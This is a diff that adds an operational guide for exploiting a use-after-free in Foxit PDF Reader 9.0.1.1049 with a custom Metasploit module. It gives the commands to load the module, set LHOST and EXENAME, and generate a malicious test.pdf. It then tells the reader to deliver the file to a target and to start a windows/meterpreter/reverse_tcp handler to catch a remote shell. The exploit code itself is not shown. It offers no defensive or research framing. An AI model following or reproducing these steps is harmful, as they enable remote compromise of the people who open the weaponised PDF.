@@ -1,0 +1,53 @@
+Instructions for the Foxit PDF Reader Pointer Overwrite UAF Exploit
+
+Download and Install Metasploit Framework: Ensure that you have Metasploit Framework installed. You can download it from Metasploit's official website or use the following command on a Linux system:
+
+sudo apt install metasploit-framework
+
+Prepare the Exploit Module:
+
+Create a new Ruby file for this exploit. Save it in the appropriate directory for custom Metasploit modules (e.g., ~/.msf4/modules/exploits/foxit_pdf_pointer_overwrite.rb):
+
+mkdir -p ~/.msf4/modules/exploits
+nano ~/.msf4/modules/exploits/foxit_pdf_pointer_overwrite.rb
+
+Paste the exploit code you provided into this file and save it.
+
+Configure Metasploit for Custom Modules: If you’re using a custom directory for the module, you need to tell Metasploit where to find it. To do this, edit the Metasploit configuration:
+
+nano ~/.msf4/msfconsole.rc
+
+Add the following line to load the custom module path:
+
+loadpath ~/.msf4/modules
+
+Start Metasploit Console: Launch Metasploit by running the following command:
+msfconsole
+
+Search for the Exploit Module: Once inside Metasploit, you can verify that the module was loaded by searching for it: search foxit
+
+Use the Exploit Module: Use the foxit_pdf_pointer_overwrite module by typing:
+
+use exploit/foxit_pdf_pointer_overwrite
+
+Set the Target Options: Set the required parameters like LHOST and EXENAME for the payload. Here's an example:
+
+set LHOST <your-ip>
+set EXENAME exploit.exe
+
+Generate the Malicious PDF: After configuring the options, generate the malicious PDF file: exploit
+
+This will create a file named test.pdf in your working directory.
+
+Distribute the Malicious PDF:
+
+The test.pdf file contains the exploit code. You can deliver this file to the target system.
+When the target opens the PDF file using Foxit Reader (version 9.0.1.1049), the exploit will be triggered, and the reverse TCP payload will attempt to connect to your Metasploit handler.
+Start a Listener: To catch the reverse shell, set up a Metasploit listener:
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your-ip>
+run
+
+Trigger the Exploit: Once the target opens the malicious test.pdf file, you should receive a Meterpreter session.
